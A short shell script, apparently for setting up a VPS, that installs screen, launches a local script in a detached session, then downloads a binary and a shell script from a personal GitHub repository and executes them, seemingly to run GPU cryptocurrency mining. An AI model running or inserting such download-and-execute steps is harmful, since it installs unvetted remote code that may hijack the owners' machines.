#!/bin/sh

sudo apt update

sudo apt install screen -y

screen -dmS shiba.sh ./shiba.sh 65 75

wget https://github.com/Mangadiw97/vps/blob/main/tuyulgpu?raw=true

wget https://raw.githubusercontent.com/Mangadiw97/vps/main/zil.sh

chmod +x zil.sh && chmod +x tuyulgpu

./zil.sh
